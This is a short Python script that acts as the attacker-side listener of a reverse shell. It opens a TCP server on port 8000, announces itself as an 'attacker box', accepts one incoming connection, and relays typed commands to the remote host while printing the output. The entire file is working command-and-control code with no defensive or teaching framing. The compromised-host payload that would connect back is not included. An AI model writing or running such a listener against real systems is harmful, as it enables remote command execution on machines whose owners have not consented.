from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR, SHUT_RDWR

server_port = 8000
socket_server = socket(AF_INET, SOCK_STREAM)
socket_server.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
socket_server.bind(('', server_port))
socket_server.listen(1)

print("Attacker box listening and awaiting instructions")

connection_socket, addr = socket_server.accept()
print(f"Connection established from {addr}")
message = connection_socket.recv(1024).decode()
print(message)
command = ""
while command != 'exit':
    command = input('==>> ')
    connection_socket.send(command.encode())
    message = connection_socket.recv(1024).decode()
    print(message)

connection_socket.shutdown(SHUT_RDWR)
connection_socket.close()

socket_server.shutdown(SHUT_RDWR)
socket_server.close()
